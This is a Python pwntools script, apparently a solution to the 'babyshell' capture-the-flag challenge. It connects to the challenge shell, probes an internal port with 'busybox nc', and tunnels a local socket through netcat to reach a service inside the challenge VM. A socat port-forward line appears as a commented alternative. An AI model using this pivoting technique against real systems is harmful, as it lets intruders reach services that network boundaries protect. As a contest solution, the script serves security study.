#!/usr/bin/env python3

# Alternative
# - socat TCP4:babyshell.hackable.software:1337 TCP4-LISTEN:5001,reuseaddr,fork

from pwn import *
import binascii
import socket


def recv_clean(r):
    attempts = 20
    buf = b""
    while True:
        data = r.recv(4096, timeout=0.1)
        if not data:
            buf += r.clean(0)
            if not buf and attempts > 0:
                attempts -= 1
                continue
            return buf
        else:
            buf += data


def wait_for_server(r):
    i = 0
    while True:
        log.info(f"Attempt {i}...")
        r.sendline(b'busybox nc -z localhost 4433 && echo "yyy" || echo "nnn"')
        reply = recv_clean(r)
        print(reply)
        if reply.find(b"yyy") > -1:
            break
        i += 1


r = None
if "LOCAL" in os.environ:
    r = process("./run3.sh")
else:
    r = remote("babyshell.hackable.software", 1337)
    reply = recv_clean(r)
    print(reply)
    proof_of_work = input()
    r.sendline(proof_of_work)

prompt = b":~$ "
log.info("Waiting on boot to complete")
# Sanity check
# r.sendlineafter(prompt, b"ash")
# log.success("Switched shells")

r.sendlineafter(prompt, b"stty -echo")

log.info("Waiting for server app to init request handler...")
# Alternative
# r.sendlineafter(prompt, b'sleep 10')
wait_for_server(r)

r.sendline(
    b'while true; do read line; printf "$line"; done | busybox nc localhost 4433 | hexdump -v -e \'1/1 "%02X\n"\''
)
# Alternative (using b"\\x" + client_msg_hex byte)
# r.sendlineafter(prompt, b'cat | xargs -I{} printf \'{}\' | busybox nc localhost 4433 | hexdump -v -e \'1/1 "%02X\n"\'')

# Test if replies are being parsed
# r.sendlineafter(prompt, b'printf "%s\\n" "123" "123" "123" | busybox nc localhost 4433')
# r.interactive()

print(recv_clean(r))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("localhost", 4433))
s.listen(1)
while True:
    log.info("Waiting for client connection")
    client_connection, client_address = s.accept()
    try:
        while True:
            client_msg = client_connection.recv(4096)
            if client_msg:
                print(f"client msg: {client_msg}")
                client_msg_hex = bytes(client_msg.hex(), "latin-1")
                client_msg_formatted = b"".join(
                    [
                        b"\\\\x" + client_msg_hex[i : i + 2]
                        for i in range(0, len(client_msg_hex), 2)
                    ]
                )

                r.sendline(client_msg_formatted)
                reply = recv_clean(r)
                reply = b"".join(reply.split(b"\r\n"))
                print(f"server reply (hex): {reply}")
                if not reply:
                    log.warn("Empty reply. Retrying...")
                    continue
                reply = binascii.a2b_hex(reply)
                print(f"server reply: {reply}")
                client_connection.sendall(reply)
            else:
                break
    except EOFError as e:
        log.error(e)
        log.warn("Connection closed. Retrying...")
    finally:
        client_connection.close()
